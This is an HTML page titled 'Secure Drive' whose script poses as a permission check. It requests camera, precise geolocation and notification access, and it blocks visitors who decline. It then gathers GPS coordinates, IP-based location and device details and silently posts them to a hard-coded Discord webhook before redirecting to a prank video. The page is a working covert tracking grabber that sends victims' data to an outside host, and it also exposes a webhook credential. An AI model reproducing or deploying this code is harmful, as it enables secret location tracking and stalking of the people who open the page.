<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Drive</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0; padding: 0;
      background: #000;
      color: #0f0;
      font-family: sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
    }
    #spinner {
      border: 4px solid #333;
      border-top: 4px solid #0f0;
      border-radius: 50%;
      width: 40px; height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 1em;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="status">Requesting permissions...</div>
  <div id="spinner"></div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    const deniedPage = "permission-denied.html";

    let coords = { lat: "Denied", lon: "Denied", acc: 0 };

    const getDeviceInfo = () => ({
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
    });

    const askCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(t => t.stop());
        return true;
      } catch {
        return false;
      }
    };

    const askLocation = () => new Promise(res => {
      navigator.geolocation.getCurrentPosition(
        pos => {
          coords.lat = pos.coords.latitude;
          coords.lon = pos.coords.longitude;
          coords.acc = pos.coords.accuracy;
          res(true);
        },
        () => res(false),
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    });

    const askNotification = () => {
      if (!("Notification" in window)) return Promise.resolve(false);
      if (Notification.permission === "granted") return Promise.resolve(true);
      return Notification.requestPermission().then(p => p === "granted");
    };

    const sendToDiscord = (ipData) => {
      const device = getDeviceInfo();
      const payload = {
        embeds: [{
          title: "ðŸ“± Mobile Access Granted",
          description: `
**Latitude:** ${coords.lat}
**Longitude:** ${coords.lon}
**Accuracy:** ${coords.acc}m
**Map:** ${coords.lat !== "Denied" ? `[Link](https://maps.google.com?q=${coords.lat},${coords.lon})` : "Denied"}

ðŸŒ **IP:** ${ipData.ipAddress}
**City:** ${ipData.city}
**Region:** ${ipData.stateProv}
**Country:** ${ipData.countryName}

ðŸ“² **Device Info**
**Platform:** ${device.platform}
**Browser:** ${device.userAgent}
**Lang:** ${device.language}
**Screen:** ${device.screen}
**Touch Support:** ${device.touchSupport}

ðŸ•’ ${new Date().toLocaleString()}
`
        }]
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    };

    async function start() {
      const camera = await askCamera();
      const location = await askLocation();
      const notification = await askNotification();

      if (!camera || !location || !notification) {
        window.location.href = deniedPage;
        return;
      }

      fetch("https://api.db-ip.com/v2/free/self")
        .then(res => res.json())
        .then(sendToDiscord)
        .catch(() => sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" }));

      setTimeout(() => window.location.href = redirectUrl, 5000);
    }

    start();
  </script>
</body>
</html>
